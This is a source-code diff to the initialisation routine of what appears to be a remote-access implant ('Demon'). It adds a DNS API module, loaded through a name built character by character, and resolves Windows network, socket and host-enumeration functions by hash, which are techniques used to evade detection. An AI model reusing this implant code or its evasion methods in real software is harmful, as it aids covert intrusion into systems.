@@ -611,6 +611,15 @@ VOID DemonInit( VOID )
     ModuleName[ 6 ] = 0;
     Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName );
 
+    ModuleName[ 0 ] = 'D';
+    ModuleName[ 1 ] = 'n';
+    ModuleName[ 2 ] = 's';
+    ModuleName[ 3 ] = 'a';
+    ModuleName[ 4 ] = 'p';
+    ModuleName[ 5 ] = 'i';
+    ModuleName[ 6 ] = 0;
+    Instance.Modules.Dnsapi = LdrModuleLoad( ModuleName );
+
     MemSet( ModuleName, 0, 20 );
 
     // TODO: sort function (library)
@@ -724,41 +733,49 @@ VOID DemonInit( VOID )
 
     if ( Instance.Modules.Mscoree )
     {
-        Instance.Win32.CLRCreateInstance                   = LdrFunctionAddr( Instance.Modules.Mscoree,  10918823944048432655 );
+        Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree,  10918823944048432655 );
     }
 
     if ( Instance.Modules.Iphlpapi )
     {
-        Instance.Win32.GetAdaptersInfo                     = LdrFunctionAddr( Instance.Modules.Iphlpapi, 0xbc950fc5 );
+        Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, 0xbc950fc5 );
     }
 
     if ( Instance.Modules.NetApi32 )
     {
-        Instance.Win32.NetLocalGroupEnum                   = LdrFunctionAddr( Instance.Modules.NetApi32, 0x2c3fa6b9 );
-        Instance.Win32.NetGroupEnum                        = LdrFunctionAddr( Instance.Modules.NetApi32, 0xb278fc6e );
-        Instance.Win32.NetUserEnum                         = LdrFunctionAddr( Instance.Modules.NetApi32, 0xe84c1c20 );
-        Instance.Win32.NetWkstaUserEnum                    = LdrFunctionAddr( Instance.Modules.NetApi32, 0x3f45a8a  );
-        Instance.Win32.NetSessionEnum                      = LdrFunctionAddr( Instance.Modules.NetApi32, 0x80edcd45 );
-        Instance.Win32.NetShareEnum                        = LdrFunctionAddr( Instance.Modules.NetApi32, 0xb0461db4 );
-        Instance.Win32.NetApiBufferFree                    = LdrFunctionAddr( Instance.Modules.NetApi32, 0x83e6be2  );
+        Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, 0x2c3fa6b9 );
+        Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, 0xb278fc6e );
+        Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, 0xe84c1c20 );
+        Instance.Win32.NetWkstaUserEnum  = LdrFunctionAddr( Instance.Modules.NetApi32, 0x3f45a8a  );
+        Instance.Win32.NetSessionEnum    = LdrFunctionAddr( Instance.Modules.NetApi32, 0x80edcd45 );
+        Instance.Win32.NetShareEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, 0xb0461db4 );
+        Instance.Win32.NetApiBufferFree  = LdrFunctionAddr( Instance.Modules.NetApi32, 0x83e6be2  );
 
         PUTS( "Loaded NetApi32 functions" )
     }
 
     if ( Instance.Modules.Ws2_32 )
     {
-        Instance.Win32.WSAStartup                          = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6128c683 );
-        Instance.Win32.WSACleanup                          = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7f1aab78 );
-        Instance.Win32.WSASocketA                          = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x559f159a );
-        Instance.Win32.ioctlsocket                         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6dcd609  );
-        Instance.Win32.bind                                = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9499e2 );
-        Instance.Win32.listen                              = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xb794014  );
-        Instance.Win32.accept                              = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xf15ae9b5 );
-        Instance.Win32.closesocket                         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x494cb104 );
-        Instance.Win32.recv                                = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9d4d95 );
-        Instance.Win32.send                                = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9ddb4f );
+        Instance.Win32.WSAStartup   = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6128c683 );
+        Instance.Win32.WSACleanup   = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7f1aab78 );
+        Instance.Win32.WSASocketA   = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x559f159a );
+        Instance.Win32.ioctlsocket  = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6dcd609  );
+        Instance.Win32.bind         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9499e2 );
+        Instance.Win32.listen       = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xb794014  );
+        Instance.Win32.accept       = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xf15ae9b5 );
+        Instance.Win32.closesocket  = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x494cb104 );
+        Instance.Win32.recv         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9d4d95 );
+        Instance.Win32.send         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9ddb4f );
+        Instance.Win32.connect      = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xd3764dcf );
 
         PUTS( "Loaded Ws2_32 functions" )
+    }
+
+    if ( Instance.Modules.Dnsapi )
+    {
+        Instance.Win32.DnsQuery_A = LdrFunctionAddr( Instance.Modules.Dnsapi, 0xeb04a380 );
+
+        PUTS( "Loaded DnsApi functions" )
     }
 
     PUTS( "Set basic info" )
